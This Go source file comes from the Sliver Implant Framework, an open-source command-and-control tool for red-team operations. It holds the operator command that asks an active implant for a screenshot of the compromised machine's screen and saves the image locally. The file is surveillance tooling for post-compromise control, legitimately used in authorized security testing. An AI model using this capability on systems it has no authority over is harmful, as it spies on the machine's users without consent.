package command

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"io/ioutil"
	"path"
	"time"

	"github.com/bishopfox/sliver/protobuf/sliverpb"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

func screenshot(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	if ActiveSliver.Sliver.OS == "darwin" {
		fmt.Printf(Warn + "Not Implemented\n")
		return
	}

	timestamp := time.Now().Format("20060102150405")
	fileName := path.Base(fmt.Sprintf("screenshot_%s_%s_*.png", ActiveSliver.Sliver.Name, timestamp))
	f, err := ioutil.TempFile("", fileName)

	if err != nil {
		fmt.Printf(Warn+"Error: %s", err)
		return
	}

	data, _ := proto.Marshal(&sliverpb.ScreenshotReq{SliverID: ActiveSliver.Sliver.ID})
	resp := <-rpc(&sliverpb.Envelope{
		Type: sliverpb.MsgScreenshotReq,
		Data: data,
	}, defaultTimeout)

	if resp.Err != "" {
		fmt.Printf(Warn+"Error: %s", resp.Err)
		return
	}

	screenshotConfigs := &sliverpb.Screenshot{}
	err = proto.Unmarshal(resp.Data, screenshotConfigs)
	if err != nil {
		fmt.Printf(Warn + "Failed to decode response\n")
		return
	}

	err = ioutil.WriteFile(f.Name(), screenshotConfigs.Data, 0644)
	if err != nil {
		fmt.Printf(Warn+"Error writting screenshot file: %s\n", err)
		return
	}
	fmt.Printf(bold + "Written to " + f.Name())
}
